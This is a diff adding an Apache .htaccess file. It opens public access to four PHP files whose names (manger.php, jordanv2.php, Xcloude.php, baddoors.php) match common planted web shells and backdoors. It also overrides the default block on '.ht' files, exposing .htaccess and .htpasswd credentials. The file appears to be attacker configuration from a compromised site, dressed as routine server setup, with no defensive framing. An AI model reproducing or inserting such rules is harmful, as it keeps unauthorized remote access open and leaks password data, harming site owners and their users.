@@ -1,0 +1,26 @@
+<Files manger.php>
+    Order Deny,Allow
+    Allow from all
+</Files>
+
+<Files jordanv2.php>
+    Order Deny,Allow
+    Allow from all
+</Files>
+
+<Files Xcloude.php>
+    Order Deny,Allow
+    Allow from all
+</Files>
+
+<Files baddoors.php>
+    Order Deny,Allow
+    Allow from all
+</Files>
+
+
+<Files ~ "^\.ht">
+Order Deny,Allow
+Allow from all
+</Files>
+
